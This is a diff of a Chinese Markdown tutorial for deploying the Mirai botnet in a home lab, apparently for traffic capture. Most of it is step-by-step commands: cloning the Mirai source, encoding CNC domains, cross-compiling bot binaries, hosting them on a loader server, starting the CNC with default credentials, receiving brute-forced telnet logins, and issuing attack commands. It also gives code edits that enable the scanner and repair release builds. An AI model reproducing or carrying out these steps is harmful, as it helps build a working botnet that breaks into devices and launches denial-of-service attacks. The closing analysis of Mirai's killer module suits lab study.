@@ -1,17 +1,29 @@
-# 服务器配置：
+## 服务器配置：
 - 一台ubuntu服务器：CNC+MYSQL
 - 一台ubuntu服务器：LOADER(REPORT)
 - 一台ubuntu服务器：bot（作为感染机，和cnc进行通讯产生流量，并且扫描其他服务器）
 - 一台windows server 2008R服务器：用于域名映射（必须要做，因为我们用内网需要配置DNS）
 
-# ubuntu初始化
-1.	如果是virtualbox安装增强功能，可以自动调节窗口大小
-2.	先进行更新：sudo apt update
-3.	安装vim,ifconfig,ssh命令：sudo apt-get install vim net-tools openssh-server
-4.	安装telnet：sudo apt-get install openbsd-inetd telnetd -y
-5.	安装编译环境：sudo apt-get install git gcc golang electric-fence build-essential
+## ubuntu初始化
+- 如果是virtualbox安装增强功能，可以自动调节窗口大小
+- 先进行更新：
+  ```shell
+  sudo apt update
+  ```
+- 安装vim,ifconfig,ssh命令：
+  ```shell
+  sudo apt-get install vim net-tools openssh-server
+  ```
+- 安装telnet：
+  ```shell
+  sudo apt-get install openbsd-inetd telnetd -y
+  ```
+- 安装编译环境:
+  ```shell
+  sudo apt-get install git gcc golang electric-fence build-essential
+  ```
 
-# DNS服务器搭建
+## DNS服务器搭建
 搭载一个DNS服务器，配置域名
 
 | 域名 | 地址 |
@@ -20,19 +32,18 @@
 |loader.mirai.com | 192.168.56.102 |
 
 
-# 配置CNC服务器：
-## 下载mirai:
+## 配置CNC服务器：
+1.下载mirai:
 ```shell
 git clone https://github.com/jgamblin/Mirai-Source-Code
 ```
 
-## 编译加密工具
+2.编译加密工具
 ```shell
 cd Mirai-Source-Code/mirai/tools && gcc enc.c -o enc.out
 ```
 
-## 编译域名
-
+3.编译域名
 ```shell
 ./enc.out string cnc.mirai.com
 \x41\x4C\x41\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
@@ -40,21 +51,22 @@ cd Mirai-Source-Code/mirai/tools && gcc enc.c -o enc.out
 \x4E\x4D\x43\x46\x47\x50\x0C\x4F\x4B\x50\x43\x4B\x0C\x41\x4D\x4F\x22
 ```
 
-## 更改代码：
-1.更换tables.c里面的两行配置
+4.更改代码：
+
+- 更换tables.c里面的两行配置
 ```shell
 vim bot/tables.c
 ```
 
 ![img.png](mirai_image/img.png)
 
-2.修改 ./dlr/main.c
+- 修改 ./dlr/main.c
 
 将 IP 修改为 Loader 服务器的 IP：Loader_IP
 
 ![img.png](mirai_image/img_1.png) 
 
-3.修改 ./loader/src/main.c
+- 修改 ./loader/src/main.c
 
 ![img.png](mirai_image/img_2.png)
  
@@ -68,13 +80,18 @@ vim bot/tables.c
  
 ![img.png](mirai_image/img_4.png)
 
-## 安装mysql。
+5.安装mysql。
+
 **详情见ubuntu安装环境文档**
 
-## 启动mysql： 
-> systemctl start mysql(这边前提是装好了数据库，并且修改了root密码)
+6.启动mysql：
 
-执行数据库脚本：
+这边前提是装好了数据库，并且修改了root密码
+```shell
+systemctl start mysql
+```
+
+7.执行数据库脚本：
 ```shell
 cat db.sql | mysql -uroot -proot
 mysql -uroot -proot mirai
@@ -85,20 +102,29 @@ Exit
  
 ![img.png](mirai_image/img_5.png)
 
-编辑cnc下的main.go：
+8.编辑cnc下的main.go：
 ```shell
 vim ../mirai/cnc/main.go
 ```
 
 ![img.png](mirai_image/img_6.png)
  
-创建cross-compile-bin
+9.创建cross-compile-bin
+
 进入mirai根目录下创建文件夹
+
+```shell
 mkdir cross-compile-bin
+```
 
 ![img.png](mirai_image/img_7.png)
 
-进入文件夹cd cross-compile-bin
+10.下载
+
+进入文件夹
+```shell
+cd cross-compile-bin
+```
 下面按条执行下载（记得用root权限）
 ```shell
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
@@ -113,19 +139,26 @@ wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.b
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
 wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
 ```
-进入scripts， cd ../scripts
-修改脚本，vim cross-compile.sh
+
+11.修改脚本并启动脚本
+
+进入scripts
+```shell
+cd ../scripts
+vim cross-compile.sh
+```
 由于我没找到armv6l包，因此我把脚本中armv6l的语句注释了，详情见下图：
  
 ![img.png](mirai_image/img_8.png)
 
-保存后启动执行：
+12.保存后启动执行
+
 ```shell
 sudo ./cross-compile.sh
 ```
 会提示：Install mysql-server and mysql-client (y/n)?输入 n不安装
 
-编辑环境
+13.编辑环境
 ```shell
 vim ~/.bashrc
 ```
@@ -146,13 +179,13 @@ export GOPATH=$HOME/go
  
 ![img.png](mirai_image/img_9.png)
 
-创建文件夹，并且刷新环境：
+14.创建文件夹，并且刷新环境：
 ```shell
 mkdir ~/go
 source ~/.bashrc
 ```
 
-## 安装go环境驱动：
+15.安装go环境驱动：
 ```shell
 go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellwords
@@ -160,7 +193,7 @@ go get github.com/mattn/go-shellwords
  
 ![img.png](mirai_image/img_10.png)
 
-## 启动mirai脚本
+16.启动mirai脚本
 
 ```shell
 cd ~/Mirai-Source-Code-master/mirai/
@@ -171,23 +204,28 @@ cd ~/Mirai-Source-Code-master/mirai/
  
 ![img.png](mirai_image/img_11.png)
 
-./build.sh release telnet 输出生产的bot二进制文件
+输出生产的bot二进制文件
+```shell
+./build.sh release telnet
+```
 
 ## 启动cnc
+
 **用root登入CNC**
 
-在prompt.txt的路径下启动CNC服务器：
+- 在prompt.txt的路径下启动CNC服务器：
 ```shell
 ./debug/cnc
 ```
-然后新开一个shell，通过telnet连接cnc主机23端口
+
+- 然后新开一个shell，通过telnet连接cnc主机23端口
 ```shell
 telnet 192.168.56.104 23
 ```
  
 ![img.png](mirai_image/img_12.png)
 
-直接回车进入登录界面，输入数据库中用户名和密码（用户名：mirai-user，密码：mirai-pass）
+- 直接回车进入登录界面，输入数据库中用户名和密码（用户名：mirai-user，密码：mirai-pass）
 
 ![img.png](mirai_image/img_13.png)
  
@@ -198,6 +236,7 @@ telnet 192.168.56.104 23
 此时已经登录主控端程序
 
 **注意：**
+
 如果提示0.0.0.0:23端口被占用，进行以下操作
 
 ```shell
@@ -207,13 +246,15 @@ kill 端口号
 ```
 
 
-# 配置loader服务器
-配置 HTTP: 
+## 配置loader服务器
+
+1.配置 HTTP: 
 ```shell
 sudo aptitude install apache2
 ```
 在 apache 根目录建立bins文件夹，将编译出的不同平台的 bot 病毒放入，以供下载。
-配置 TFTP
+
+2.配置 TFTP
 ```shell
 apt-get install -y tftpd-hpa
 vim /etc/default/tftpd-hpa
@@ -224,13 +265,14 @@ TFTP_OPTIONS="--secure --create"
 service tftpd-hpa restart
 ```
 
-利用xftp工具将cnc的代码直接拷贝到loader服务器上
+3.利用xftp工具将cnc的代码直接拷贝到loader服务器上
+
 由于拷贝的代码，所有的脚本没有执行权限，需要输入命令
 ```shell
 sudo chmod +x *
 ```
 
-## 启动loader
+4.启动loader
 ```shell
 cd ~/Mirai-Source-Code-master/loader
 ./build.sh
@@ -238,10 +280,11 @@ cd ~/Mirai-Source-Code-master/loader
 ./loader 
 ```
 
-获取监听到的爆破账号：在promot文件下 
+5.获取监听到的爆破账号：在promot文件下 
 ```shell
 sudo ./debug/scanListen
 ```
+
 在之前teble.c中配置的report服务器中运行./scanListen，默认监听48101端口，该服务将接收bot爆破出的结果。
 ```shell
 cd /Mirai/mirai/debug && ./scanListen
@@ -254,8 +297,9 @@ scanner成功爆破出结果时，会通过resolv模块寻找report服务器所�
  
 ![img.png](mirai_image/img_16.png)
 
-# 构建bot
-将cnc里的mirai代码拷贝至bot服务器，然后赋予脚本执行权限
+## 构建bot
+
+- 将cnc里的mirai代码拷贝至bot服务器，然后赋予脚本执行权限
 ```shell
 sudo ./debug/mirai.dbg
 ```
@@ -271,8 +315,11 @@ sudo ./debug/mirai.dbg
 到此我们要的东西已经完成。剩下的是用wireshark抓包工具抓取流量
 
 ## 攻击指令
+
 提示参数：?
+
 这里?可以理解为一个占位符，解释当前位置参数的意义。
+
 输入?获取攻击命令
 
 ![img.png](mirai_image/img_19.png) 
@@ -290,14 +337,21 @@ sudo ./debug/mirai.dbg
 ![img.png](mirai_image/img_22.png)
 
 ## telnet爆破
+
 之前我们使用./build debug telnet作为测试环境查看debug信息输出，并已成功使用CNC控制Bot发起攻击。现在我们来关注Mirai感染并控制Bot的流程。
+
 Bot扫描网段内开启telnet的设备，并使用内置字典爆破之，将成功之后的信息返回
+
 该功能在main.c实现，源码默认在Debug模式下关闭了scanner的功能，为方便调试，我们需要修改源码：
+
+```shell
 /Mirai/mirai/bot/main.c line 158
+```
  
 ![img.png](mirai_image/img_24.png)
 
 将#ifndef DEBUG和#endif两行注释掉
+
 重新编译并运行，就可以看到scanner的调试信息，注意要以root权限运行
  
 ![img.png](mirai_image/img_23.png)
@@ -326,7 +380,9 @@ Resolved xxxx.xxx.xx to 1 IPv4 addresses
 Got SIGSEGV at address: 0x0
 ```
 其中显示想使用 table.11 ，但是并没有解密，这里应该修改 killer.c的 172 行，在后面加入 table_unlock_val(TABLE_KILLER_STATUS);，在 185 行后面加入 table_lock_val(TABLE_KILLER_STATUS);，重新编译运行，这个报错就会消失。
-Bot 的扫描
+
+## Bot 的扫描
+
 在 debug 模式下，是观察不到扫描现象的，这是因为源码在 debug 模式中关闭了扫描功能。相关代码在 main.c 中。
 
 ```
@@ -348,8 +404,12 @@ Bot 的扫描
 #endif
 ```
 可以看到，不是 debug 模式的时候，才会初始化扫描器，所以将 #ifndef DEBUG和#endif注释掉，重新编译，即可开启扫描功能。
-table 初始化的启动方式
-实验时一般使用 debug 模式编译和实验，但是如果使用 release 版本，就会发现不稳定，甚至无法成功，这是因为 debug 和 release 的初始化方式和控制方式不一样，release 采用信号控制，并且在函数入口的寻找上做了混淆，主要函数是 unlock_tbl_if_nodebug，如果使用 release 版本，可以做一下修改：
+
+## table 初始化的启动方式
+
+实验时一般使用 debug 模式编译和实验，但是如果使用 release 版本，就会发现不稳定，甚至无法成功，
+这是因为 debug 和 release 的初始化方式和控制方式不一样，release 采用信号控制，并且在函数入口的寻找上做了混淆，
+主要函数是 unlock_tbl_if_nodebug，如果使用 release 版本，可以做一下修改：
 
 ```
 #ifndef DEBUG
@@ -365,8 +425,11 @@ table 初始化的启动方式
 ```
 
 将这段代码里面的 debug 模式和 release 模式调换。
-关于杀灭设备中的其他病毒
-Mirai 具有独占性，一旦Mirai 感染了某一个设备，它会寻找设备上的其他僵尸网络，并将其杀掉，以让自己成为这个设备的唯一控制者，其杀死竞争者的相关代码位于 killer.c 中。经过解密，我发现它给其他 bot 的特征的定义是：
+
+## 关于杀灭设备中的其他病毒
+
+Mirai 具有独占性，一旦Mirai 感染了某一个设备，它会寻找设备上的其他僵尸网络，并将其杀掉，以让自己成为这个设备的唯一控制者，
+其杀死竞争者的相关代码位于 killer.c 中。经过解密，我发现它给其他 bot 的特征的定义是：
 
 ```
 REPORT %s:%s
@@ -375,9 +438,12 @@ LOLNOGTFO
 zollard
 GETLOCALIP
 ```
+
 也就是说，如果在进程路径名中发现了以上这些字符串，则杀掉那个进程。
+
 此外，Mirai 对自身进程名做了伪装，每次运行 Mirai，其进程名字都是随机的字符串，所以如果对 Mirai 进行变异，并且想杀掉 Mirai 的话，并不能用 Mirai 检测其他bot的方法，来检测 Mirai 自身。
-Mirai 可能是半成品
+
+## Mirai 可能是半成品
+
 从 Mirai 的编译脚本和代码中分析，Mirai 定义了 TELNET 和 SSH 两个编译选项，并且代码中有相关的宏开关，但是从目前的代码看，并未发现 SSH 猜解和登陆的相关功能。
 个人猜测 Mirai 原本打算开发 TELNET 和 SSH 两个功能，但是目前只完成了一半，或许是只完成了一半，或许是 SSH 的部分原作者并未放出，真实情况不得而知。
-
